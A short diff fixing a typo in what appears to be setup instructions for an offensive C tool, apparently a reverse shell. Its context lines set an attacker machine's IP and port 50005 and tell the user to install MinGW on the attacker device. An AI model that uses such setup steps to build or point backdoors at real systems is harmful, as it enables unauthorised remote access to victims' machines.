@@ -19,7 +19,7 @@ ServPort = 50005 ;
 ```
 For the Server;
 ```
-server_address.sin_addr.s_addr = inet_addr("ENTER ATTACKER MACHINE IP ADDRES SHERE");
+server_address.sin_addr.s_addr = inet_addr("ENTER ATTACKER MACHINE IP ADDRES HERE");
 server_address.sin_port = htons(50005);
 ```
 - Install ming into you attacker device 
